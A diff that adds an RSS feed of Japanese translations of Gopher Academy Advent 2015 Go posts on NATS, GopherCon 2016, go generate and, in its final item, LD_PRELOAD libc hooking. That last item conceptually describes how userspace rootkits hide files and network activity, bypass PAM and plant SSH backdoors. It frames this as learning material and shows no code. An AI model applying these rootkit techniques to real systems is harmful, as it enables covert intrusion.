@@ -1,0 +1,1465 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Gopheracademy-advent-2015-jas on tbd</title>
+    <link>http://localhost:1313/gopheracademy-advent-2015-ja/</link>
+    <description>Recent content in Gopheracademy-advent-2015-jas on tbd</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>ja</language>
+    <lastBuildDate>Thu, 31 Dec 2015 15:09:48 -0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/gopheracademy-advent-2015-ja/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>12月16日 - NATS: High Performance Cloud Native Messaging Written in Go</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/16-nats-high-performance-cloud-native-messaging-written-in-go-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:48 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/16-nats-high-performance-cloud-native-messaging-written-in-go-ja/</guid>
+      <description>&lt;p&gt;description追記と日付
+date +1
+title追記と日付
+original
+以下のnoteのリンクと日付&lt;/p&gt;
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/nats-high-performance-cloud-native-messaging-written-in-go/&#34;&gt;12月16日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;分散システムを構築しようとする場合、スケール時のパフォーマンスは非常に重要だ。
+サービスの構成要素は複数の物理・仮想インフラ上に広がり、数千または数百万のデバイス(IoT)に渡る場合もある。
+しかし、エンドユーザからすると一つのものであるかのようにシームレスに操作できる必要がある。
+これには高速かつ軽量で常に利用可能なコミュニケーションが必要だ。&lt;/p&gt;
+
+&lt;p&gt;NATSはクラウドネイティブなアプリケーション用の非常に軽量でスケーラブルなPubSubメッセージングシステムである。
+元々は&lt;a href=&#34;https://twitter.com/derekcollison&#34;&gt;Derek Collison&lt;/a&gt;によってCloud Foundryを作ったときに内部のメッセージングレイヤとして作られた。
+&lt;a href=&#34;http://www.nats.io/&#34;&gt;NATS&lt;/a&gt;の元々のバージョンはRubyで書かれていたが、Goへポートされた。
+NATSのGo実装は&lt;a href=&#34;http://www.nats.io/&#34;&gt;gnatsd&lt;/a&gt;と呼ばれRubyのnatsよりもパフォーマンス面で優れている。&lt;/p&gt;
+
+&lt;p&gt;DerekがApceraを創設した際、NATSは内部のcontrol planeとして再び使われたが、このときGoにポートされた。
+Apceraは2014年にDerekが行った&lt;a href=&#34;https://www.youtube.com/watch?v=qC9WhjmewIk&#34;&gt;発表&lt;/a&gt;にある多くの理由(例えばGoがどのように並行処理をhandleするか、コンパイル言語のシンプルさ等)によって、スケーラブルな分散システムアーキテクチャ向けのGoを支持していたためだ。&lt;/p&gt;
+
+&lt;p&gt;NATSが何であるか理解するのと同じくらいNATSが何で無いかを認識することは重要だ。
+NATSは従来のエンタープライズ向けのメッセージングシステムとしては意図されていない。
+むしろ常に利用可能な短命な神経系システムとして捉えることができる。
+シンプルさと高速性という根幹にある信条に従ってNATSは、Goのように、スケールするモダンな分散システムをデリバリするための優れた土台を提供する。&lt;/p&gt;
+
+&lt;p&gt;これはパフォーマンスを増強するために素早く調整された(例えば、初期のバージョンではプロトコルのメッセージのパースに正規表現が使われていたが、現在は独自のzero allocationのパーサーによって実装されている)。
+2014年のサードパーティのベンチマークではNATSは低遅延のまま6Mメッセージ/秒を記録した。
+現在NATSは低遅延でおよそ8Mメッセージ/秒の送信が可能でスピードは速くなりつづけている。&lt;/p&gt;
+
+&lt;p&gt;Apceraが好きなGoの別の面としてはシンプルさだ。このおかげでNATSは理想的なものになっている。
+NATSは非常に軽量かつ高速にデザインされている。
+常に利用可能な発信音&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月11日 - Announcing GopherCon 2016</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/11-announcing-gophercon-2016-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:36 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/11-announcing-gophercon-2016-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/announcing-gophercon-2016/&#34;&gt;12月11日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;img  src=/images/gopheracademy-advent-2015-ja/gophercon2016.svg   alt=&#34;GopherCon 2016&#34;    width=&#34;300&#34;       class=&#39;pure-img img-center&#39;&gt;
+
+&lt;p&gt;GopherCon 2016は2016年7月11日から13日にかけてColorado州DenverのColorado Convention Centerで開催される。&lt;/p&gt;
+
+&lt;p&gt;GopherCon 2015のフィードバックを受けて、GopherCon 2016での変更点を説明したい。&lt;/p&gt;
+
+&lt;h2 id=&#34;複数トラック:2f71cf9c434acc47b00da65e031e951a&#34;&gt;複数トラック&lt;/h2&gt;
+
+&lt;p&gt;2016の大きな変更は午後のセッションを複数トラックで行うことだ。
+初日と二日目はメインシアターで30分の全員参加の発表をランチタイムまでいくつか行う。
+ランチのあとは50分のチュートリアルセッションを行う2トラック分の会場を追加で確保する。
+チュートリアルセッションはメインシアターで行われる他の発表及びパネルディスカッションとパラレルで行われる。
+全て録画されカンファレンス終了後に公開されるので3会場で同時に行われても見逃すことはない。&lt;/p&gt;
+
+&lt;p&gt;最終日は前年同様に自由参加型のhack dayを行うが、より多くのbreakout roomを開き、お好みのGoのオープンソースプロジェクトに関するBoFセッションを行う。&lt;/p&gt;
+
+&lt;h2 id=&#34;全員にメンター:2f71cf9c434acc47b00da65e031e951a&#34;&gt;全員にメンター&lt;/h2&gt;
+
+&lt;p&gt;GopherConはGoのコミュニティからの新しい発表者をフィーチャーする慣習を誇りに思っているが、1500人の前で発表するのは簡単ではないだろう。
+2015のときは発表者に経験豊富な発表者とペアとなる機会を提供し、良い結果が得られた。&lt;/p&gt;
+
+&lt;p&gt;このメンターシップの慣習を改善して、GopherCon 2016では全ての発表者は発表の準備と練習を手伝うメンターとペアになる。&lt;/p&gt;
+
+&lt;p&gt;全員参加のセッションとチュートリアルセッションの発表申し込みは2016年1月1日に開始する。
+詳細は&lt;a href=&#34;http://cfp.gopercon.com/&#34;&gt;http://cfp.gopercon.com/&lt;/a&gt;を参照。&lt;/p&gt;
+
+&lt;h2 id=&#34;全員参加型セッションの最中での質問は禁止:2f71cf9c434acc47b00da65e031e951a&#34;&gt;全員参加型セッションの最中での質問は禁止&lt;/h2&gt;
+
+&lt;p&gt;技術系カンファレンスでの質問は評判が悪い。真っ先に質問しようとする一方で分かりやすい質問を用意するというプレッシャーがある。
+&amp;ldquo;well, actually,&amp;ldquo;等の間が発生する危険がある。また、質問タイムは次の発表者がラップトップをプロジェクターと接続する時間のつなぎだと思われてしまうのも仕方がないことだ。
+実際、発表者の多くはカンファレンスで発表する際に最もストレスフルなのは質問タイムだと言っている。&lt;/p&gt;
+
+&lt;p&gt;GopherCon 2016では別の方法を試してみようと思う。
+それぞれの発表の最後に数分間の質問時間を取るのではなく、発表者がパネルディスカッションに参加するランチのあとまで質問を待ってもらうことにする。&lt;/p&gt;
+
+&lt;p&gt;午後のチュートリアルセッションでは質問しやすい小さい部屋なので、発表者には質問に応じて話をしてもらうようにする。&lt;/p&gt;
+
+&lt;h2 id=&#34;ワークショップトレーニング:2f71cf9c434acc47b00da65e031e951a&#34;&gt;ワークショップトレーニング&lt;/h2&gt;
+
+&lt;p&gt;カンファレンスとは別に7月10日の日曜日にワークショップトレーニングを行う。&lt;/p&gt;
+
+&lt;p&gt;ワークショップは2トラックのトレーニングをパラレルで行う。
+トラック1は丸一日の本格的なGoのワークショップになるだろう。
+トラック2は標準ライブラリの高度な使い方とGoのプログラムのデバッグにフォーカスした内容になるだろう。&lt;/p&gt;
+
+&lt;p&gt;ワークショップのチケットは別に購入できる。&lt;/p&gt;
+
+&lt;h2 id=&#34;多様性:2f71cf9c434acc47b00da65e031e951a&#34;&gt;多様性&lt;/h2&gt;
+
+&lt;p&gt;GopherConではあらゆる人が歓迎される。ステージ上で話す人も観客としても初めてのGoのカンファレンスだとしても10回目だとしても歓迎される。&lt;/p&gt;
+
+&lt;p&gt;我々は多様性を奨励するので、様々なスピーカーからの申し込みをお願いしたい。
+より楽しく有益かつ包括的なカンファレンスにするため、申し込みをしていないスピーカーを招待するかもしれない。&lt;/p&gt;
+
+&lt;h2 id=&#34;code-of-conduct:2f71cf9c434acc47b00da65e031e951a&#34;&gt;Code of Conduct&lt;/h2&gt;
+
+&lt;p&gt;GopherConは&lt;a href=&#34;https://golang.org/conduct&#34;&gt;Go Community Code of Conduct&lt;/a&gt;を採用することを宣言する。&lt;/p&gt;
+
+&lt;p&gt;GopherCon及び運営団体であるGopher Academyは、年齢・障害・性別・国籍・人種・宗教・性的関心等によらず全ての人にとってハラスメントの無いカンファレンスを提供することに尽力する。&lt;/p&gt;
+
+&lt;p&gt;どのような形でのハラスメントも許容できない。これらのルールを犯したものにはカンファレンスの主催者の裁量で法的措置や退出といった対応が取られるだろう。&lt;/p&gt;
+
+&lt;p&gt;完全な詳細は2016年1月1日にGopherConのウェブサイトで利用可能になる。&lt;/p&gt;
+
+&lt;h2 id=&#34;2016年1月1日に全てが始まる:2f71cf9c434acc47b00da65e031e951a&#34;&gt;2016年1月1日に全てが始まる&lt;/h2&gt;
+
+&lt;p&gt;今回の案内はほんの一部にすぎない。
+2016年1月1日に詳細が明らかになるだろう。
+詳細はGopherCon 2016のウェブサイトを参照して欲しい。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://gophercon.com/&#34;&gt;https://gophercon.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;先行販売チケットは2016年1月1日に販売開始だ。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月10日 - Reducing boilerplate with go generate</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/10-reducing-boilerplate-with-go-generate-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:35 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/10-reducing-boilerplate-with-go-generate-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/reducing-boilerplate-with-go-generate/&#34;&gt;12月10日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;Goは素晴らしい言語だ。シンプルでパワフルな素晴らしいツールがあり、多くの人が日々本当にGoを楽しんでいる。
+しかし型付けされた言語でよくあるようにたくさんのboilerplateを書かなければならない。&lt;/p&gt;
+
+&lt;p&gt;このポストでは主に以下の3つの点をカバーする。&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;なぜコード生成を使ってboilerplateを削減するようなツールをGoで書くことができるのか&lt;/li&gt;
+&lt;li&gt;Goでのコード生成は何で構成されているか&lt;/li&gt;
+&lt;li&gt;より詳しく知りたい場合にコード生成ツールの例がどこにあるか&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;なぜboilerplateを削減するためにコード生成を使うのか:e2f2be23ee9108c94286c14975225274&#34;&gt;なぜboilerplateを削減するためにコード生成を使うのか&lt;/h2&gt;
+
+&lt;p&gt;boilerplateを削減するためにリフレクションを使ったり、&lt;code&gt;interface{}&lt;/code&gt;を受け取るメソッドだらけにしたりしてしまうことがある。
+しかし、メソッドが&lt;code&gt;interface{}&lt;/code&gt;を受け取る際は型安全性を捨ててしまっている。
+型のアサーションとリフレクションを使う場合、正しい型を渡しているかのチェックをコンパイラができなくなり実行時にpanicが発生しやすくなってしまう。&lt;/p&gt;
+
+&lt;p&gt;いくつかのboilerplateコードはプロジェクト内の既存のコードから推測できる場合が多い。
+よって、プロジェクトのソースコードを読み、関連するコードを生成するツールを作ることができる。&lt;/p&gt;
+
+&lt;h2 id=&#34;コード生成の構成要素:e2f2be23ee9108c94286c14975225274&#34;&gt;コード生成の構成要素&lt;/h2&gt;
+
+&lt;h3 id=&#34;コードの読み込み:e2f2be23ee9108c94286c14975225274&#34;&gt;コードの読み込み&lt;/h3&gt;
+
+&lt;p&gt;標準ライブラリにはコードを読んでパースする際に手間のかかる作業を行ってくれる素晴らしいパッケージが揃っている。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;go/build&lt;/code&gt;: goのパッケージの情報を集める。パッケージ名が与えられるとパッケージのソースディレクトリやその中のソースファイル・テストファイル、及び依存している他のパッケージ等の情報を返す。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;go/scanner&lt;/code&gt;及び&lt;code&gt;go/parser&lt;/code&gt;: ソースコードを読んでパースし、&lt;a href=&#34;https://en.wikipedia.org/wiki/Abstract_syntax_tree&#34;&gt;AST&lt;/a&gt;を生成する。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;go/ast&lt;/code&gt;: ASTを表現する型を宣言し、木を探索・修正するためのメソッドを含む。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;go/types&lt;/code&gt;: データ型を宣言しGoのパッケージの型チェックに使われるアルゴリズムを実装する。&lt;code&gt;go/ast&lt;/code&gt;が木をそのまま保持するのに対して、このパッケージはASTを処理する全てのタスクを行うため、型の情報を直接取得することができる。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;コードの生成:e2f2be23ee9108c94286c14975225274&#34;&gt;コードの生成&lt;/h3&gt;
+
+&lt;p&gt;コードを生成する際、殆どのプロジェクトは旧来の&lt;code&gt;text/template&lt;/code&gt;を使って生成するだろう。&lt;/p&gt;
+
+&lt;p&gt;生成されたファイルにはコードが自動生成されたこと、どのツールが生成したか、手動で編集すべきでないことを示すコメントを書くことを推奨する。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;/*
+* CODE GENERATED AUTOMATICALLY WITH github.com/ernesto-jimenez/gogen/unmarshalmap
+* THIS FILE SHOULD NOT BE EDITED BY HAND
+*/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;go/format&lt;/code&gt;パッケージを使って書き込む前に整形することも可能だ。このパッケージは&lt;code&gt;go fmt&lt;/code&gt;で使われているロジックを含むものである。&lt;/p&gt;
+
+&lt;h3 id=&#34;go-generate:e2f2be23ee9108c94286c14975225274&#34;&gt;go generate&lt;/h3&gt;
+
+&lt;p&gt;コードを生成するツールを書き始めると、次の2つの疑問が浮かぶだろう。
+開発プロセスのどの時点でコードを生成するのか。生成されたコードをどのように最新に保つのか。&lt;/p&gt;
+
+&lt;p&gt;1.4以降ではgoツールは&lt;code&gt;generate&lt;/code&gt;をコマンドを含んでいる。
+これを使うとgoツール自身と同時にコード生成用のツールを実行することができる。
+ソースコード内の特定のコメントを使ってどのコマンドを実行するかを指定でき、&lt;code&gt;go generate&lt;/code&gt;が実行してくれる。&lt;/p&gt;
+
+&lt;p&gt;我々は以下のフォーマットでコメントを追加するだけで良い&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;//go:generate shell command
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;こうすることで実行時に&lt;code&gt;go generate&lt;/code&gt;が&lt;code&gt;command&lt;/code&gt;を自動で呼び出してくれる。&lt;/p&gt;
+
+&lt;p&gt;以下の2点を覚えておかねばならない。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;go generate&lt;/code&gt;はプログラムまたはパッケージを書いている開発者によって実行されるべきだ。&lt;code&gt;go get&lt;/code&gt;からは自動で呼ばれない。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;go generate&lt;/code&gt;に呼ばれる全てのツールは事前にシステム上にインストール及びセットアップする必要がある。どのツールを使うか、どこでダウンロードできるかは必ず記述すること。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;さらにコード生成ツールが同じレポジトリにある場合は&lt;code&gt;go:generate&lt;/code&gt;から&lt;code&gt;go run&lt;/code&gt;を呼び出すことを推奨する。そうすることでツール変更時にツールのビルドとインストールをせずに&lt;code&gt;generate&lt;/code&gt;を実行することができる。&lt;/p&gt;
+
+&lt;h2 id=&#34;どのようにツールを作り始めるか:e2f2be23ee9108c94286c14975225274&#34;&gt;どのようにツールを作り始めるか&lt;/h2&gt;
+
+&lt;p&gt;stdlibパッケージによるコードのパースと生成は素晴らしいが、ドキュメントが膨大であるし、ドキュメントからどのようにパッケージを使うかを理解するのはかなり難しいだろう。&lt;/p&gt;
+
+&lt;p&gt;私がコード生成を始めた際に行って最も良かったことは既存のツールを学ぶということだ。
+これは以下の3つの目的がある。&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;どのようなツールが作れるかインスピレーションが得られる&lt;/li&gt;
+&lt;li&gt;ツールのソースコードから学ぶチャンスがある&lt;/li&gt;
+&lt;li&gt;ツール自身がいかに便利かを知ることができる&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;学びが得られるプロジェクト:e2f2be23ee9108c94286c14975225274&#34;&gt;学びが得られるプロジェクト&lt;/h2&gt;
+
+&lt;h3 id=&#34;インターフェースを実装するスタブの生成:e2f2be23ee9108c94286c14975225274&#34;&gt;インターフェースを実装するスタブの生成&lt;/h3&gt;
+
+&lt;p&gt;実装するインターフェースに定義されているメソッドの一覧をコピペしたことはないだろうか。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/josharian/impl&#34;&gt;&lt;code&gt;impl&lt;/code&gt;&lt;/a&gt;コマンドを使うとスタブを自動生成することができる。
+これはstdlibのパッケージを使ってインターフェースを探し、実装するべきメソッドを出力してくれる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;$ impl &#39;f *File&#39; io.ReadWriteCloser
+func (f *File) Read(p []byte) (n int, err error) {
+    panic(&amp;quot;not implemented&amp;quot;)
+}
+
+func (f *File) Write(p []byte) (n int, err error) {
+    panic(&amp;quot;not implemented&amp;quot;)
+}
+
+func (f *File) Close() error {
+    panic(&amp;quot;not implemented&amp;quot;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;mockeryを使ったモックの自動生成:e2f2be23ee9108c94286c14975225274&#34;&gt;mockeryを使ったモックの自動生成&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/stretchr/testify&#34;&gt;testify&lt;/a&gt;の&lt;a href=&#34;https://godoc.org/github.com/stretchr/testify/mock&#34;&gt;mock&lt;/a&gt;パッケージは単体テスト時にdependencyのモックを作成を容易にしてくれる。
+インターフェースは暗黙的に満たされるものなので、dependencyはインターフェースを使って指定し、単体テスト時に外部のdependencyではなくモックを使うことができる。&lt;/p&gt;
+
+&lt;p&gt;例として小文字変換インターフェースのモックを作ると以下のようになる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+  &amp;quot;testing&amp;quot;
+
+  &amp;quot;github.com/stretchr/testify/mock&amp;quot;
+)
+
+type downcaser interface {
+  Downcase(string) (string, error)
+}
+
+func TestMock(t *testing.T) {
+  m := &amp;amp;mockDowncaser{}
+  m.On(&amp;quot;Downcase&amp;quot;, &amp;quot;FOO&amp;quot;).Return(&amp;quot;foo&amp;quot;, nil)
+  m.Downcase(&amp;quot;FOO&amp;quot;)
+  m.AssertNumberOfCalls(t, &amp;quot;Downcase&amp;quot;, 1)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;モックの実装は以下のようになる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type mockDowncaser struct {
+  mock.Mock
+}
+
+func (m *mockDowncaser) Downcase(a0 string) (string, error) {
+  ret := m.Called(a0)
+  return ret.Get(0).(string), ret.Error(1)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;実装から分かるように、インターフェースの定義そのものがモックの自動生成に必要な全ての情報を持っている。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/vektra/mockery&#34;&gt;&lt;code&gt;mockery&lt;/code&gt;&lt;/a&gt;を使うと自動生成ができる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ mockery -inpkg -testonly -name=downcaser
+Generating mock for: downcaser
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;私は常に&lt;code&gt;go generate&lt;/code&gt;を使ってインターフェースのモックを生成している。
+先述のコードに1行追加するだけで良い。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+  &amp;quot;testing&amp;quot;
+)
+
+type downcaser interface {
+  Downcase(string) (string, error)
+}
+
+//go:generate mockery -inpkg -testonly -name=downcaser
+
+func TestMock(t *testing.T) {
+  m := &amp;amp;mockDowncaser{}
+  m.On(&amp;quot;Downcase&amp;quot;, &amp;quot;FOO&amp;quot;).Return(&amp;quot;foo&amp;quot;, nil)
+  m.Downcase(&amp;quot;FOO&amp;quot;)
+  m.AssertNumberOfCalls(t, &amp;quot;Downcase&amp;quot;, 1)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;以下のように&lt;code&gt;go generate&lt;/code&gt;を実行すると全てがセットアップされる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;$ go test
+# github.com/ernesto-jimenez/test
+./main_test.go:14: undefined: mockDowncaser
+FAIL    github.com/ernesto-jimenez/test [build failed]
+
+$ go generate
+Generating mock for: downcaser
+
+$ go test
+PASS
+ok      github.com/ernesto-jimenez/test 0.011s
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;インターフェースに変更を加えた際は&lt;code&gt;go generate&lt;/code&gt;を実行するだけで関連するモックが最新化される。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;mockery&lt;/code&gt;は私が&lt;code&gt;testify/mock&lt;/code&gt;にコントリビュートして&lt;code&gt;testify&lt;/code&gt;のメンテナになった主な理由である。
+しかしこれは1.5で&lt;code&gt;go/types&lt;/code&gt;が標準ライブラリの一部となる前に作られたものであるので、低レベルな&lt;code&gt;go/ast&lt;/code&gt;を使って実装されている。
+そのためコードを追いにくくなっているし、&lt;a href=&#34;https://github.com/vektra/mockery/issues/18&#34;&gt;コンポジションを使ったインターフェースでモック生成に失敗する&lt;/a&gt;等のバグを導入してしまっている。&lt;/p&gt;
+
+&lt;h3 id=&#34;gogenの実験:e2f2be23ee9108c94286c14975225274&#34;&gt;gogenの実験&lt;/h3&gt;
+
+&lt;p&gt;コード生成についての知識を深めるために作っていた&lt;a href=&#34;https://github.com/ernesto-jimenez/gogen&#34;&gt;&lt;code&gt;gogen&lt;/code&gt;&lt;/a&gt;パッケージに含まれるコード生成ツールをオープンソースにした。&lt;/p&gt;
+
+&lt;p&gt;現時点では以下の3つのツールを含んでいる。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ernesto-jimenez/gogen/tree/master/cmd/goautomock/main.go&#34;&gt;goautomock&lt;/a&gt;: mockeryの類似ツールだが&lt;code&gt;go/ast&lt;/code&gt;ではなく&lt;code&gt;go/types&lt;/code&gt;を使って実装しているので、コンポジションを使ったインターフェースにも対応している。標準ライブラリのインターフェースをモックするのも簡単になっている。&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ernesto-jimenez/gogen/tree/master/cmd/gounmarshalmap&#34;&gt;gounmarshalmap&lt;/a&gt;: structを受け取り、mapをstructにデコードする&lt;code&gt;UnmarshalMap(map[string]interface{})&lt;/code&gt;関数を生成する。
+これは&lt;a href=&#34;https://github.com/mitchellh/mapstructure&#34;&gt;&lt;code&gt;mapstructure&lt;/code&gt;&lt;/a&gt;の代替となるものでリフレクションではなくコード生成を使っている。&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/ernesto-jimenez/gogen/tree/master/cmd/gospecific&#34;&gt;gospecific&lt;/a&gt;: &lt;code&gt;interface{}&lt;/code&gt;を使った汎用のパッケージから特定のパッケージを生成する。汎用のパッケージのソースコードを読み、汎用のパッケージが&lt;code&gt;interface{}&lt;/code&gt;を使っている箇所に対して特定の型を使ったパッケージを生成する(訳注:分かりにくいと思うのでリンク先の例を見てもらった方が良いかと思います。)。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;まとめ:e2f2be23ee9108c94286c14975225274&#34;&gt;まとめ&lt;/h2&gt;
+
+&lt;p&gt;コード生成は素晴らしい。同じコードを繰り返し何度も書かずに型安全を保つことができる。&lt;a href=&#34;https://slackline.io/&#34;&gt;Slackline&lt;/a&gt;ではよく使ったし、&lt;a href=&#34;https://github.com/stretchr/testify/pull/241&#34;&gt;testify&lt;/a&gt;でも恐らく使うだろう。&lt;/p&gt;
+
+&lt;p&gt;しかし「ツールを書くことが時間的に見合っているか？」ということは考えなければならない。&lt;/p&gt;
+
+&lt;p&gt;この答えには&lt;a href=&#34;https://xkcd.com/1205/&#34;&gt;xkcd&lt;/a&gt;が役に立つだろう。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://xkcd.com/1205://xkcd.com/1205/&#34;&gt;&lt;img src=&#34;http://imgs.xkcd.com/comics/is_it_worth_the_time.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月9日 - Hooking libc using Go shared libraries</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/9-libc-hooking-go-shared-libraries-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:32 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/9-libc-hooking-go-shared-libraries-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/libc-hooking-go-shared-libraries/&#34;&gt;12月9日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/_ta0&#34;&gt;Alastair O’Neill&lt;/a&gt;が8月の&lt;a href=&#34;http://www.bsidesmcr.org.uk/&#34;&gt;BSides Manchester&lt;/a&gt;セキュリティカンファレンスで&lt;code&gt;LD_PRELOAD&lt;/code&gt;の仕組みを使ったユーザ空間の&lt;a href=&#34;https://en.wikipedia.org/wiki/Rootkit&#34;&gt;ルートキット&lt;/a&gt;に関する発表を行った。このルートキットの多くはCで書かれている。
+Go1.5では共有ライブラリ用のビルドモードをサポートすることが分かっていたため、この発表を聞いた際にGoで似たようなものを書けるのではないか、そしてその過程で&lt;code&gt;LD_PRELOAD&lt;/code&gt;やcgo及びGoで共有ライブラリをビルドすることに関して何か学ぶことがあるのではないかと思った。&lt;/p&gt;
+
+&lt;p&gt;免責事項: 私はセキュリティ研究者ではないしここに載せるコードは単に学習目的の実験的なものである。&lt;/p&gt;
+
+&lt;h2 id=&#34;ld-preload-ルートキットがどのように動作するか:8928758b80ccd8cb6a9a714a1b35fa0e&#34;&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;ルートキットがどのように動作するか&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;ルートキットは多くのUnixバイナリを&lt;a href=&#34;https://en.wikipedia.org/wiki/Dynamic_linker&#34;&gt;動的にリンク&lt;/a&gt;する&lt;a href=&#34;https://en.wikipedia.org/wiki/C_standard_library&#34;&gt;libc&lt;/a&gt;ライブラリによって提供される機能の代わりとなるものを実装することによって動作する。
+これらのhookを利用して関数の挙動を変更し、&lt;a href=&#34;https://en.wikipedia.org/wiki/Pluggable_authentication_module&#34;&gt;PAM&lt;/a&gt;等の認証システムを回避することで、ルートキットは検知から逃れ、ルートキットによって設定された認証情報を使ってSSHログインできるバックドアを仕掛けるといったことを行う。&lt;/p&gt;
+
+&lt;p&gt;例えば&lt;a href=&#34;https://github.com/chokepoint/azazel&#34;&gt;Azazel&lt;/a&gt;ルートキットは&lt;a href=&#34;http://www.gnu.org/software/libc/manual/html_node/Opening-Streams.html&#34;&gt;fopen&lt;/a&gt;関数をhookし&lt;a href=&#34;https://github.com/chokepoint/azazel/blob/16ca8ac6ed7280e0da73c0f7a166c84ea03ebaa7/azazel.c#L287-L300&#34;&gt;ルートキットに関するネットワークアクティビティやファイルを隠蔽&lt;/a&gt;する。
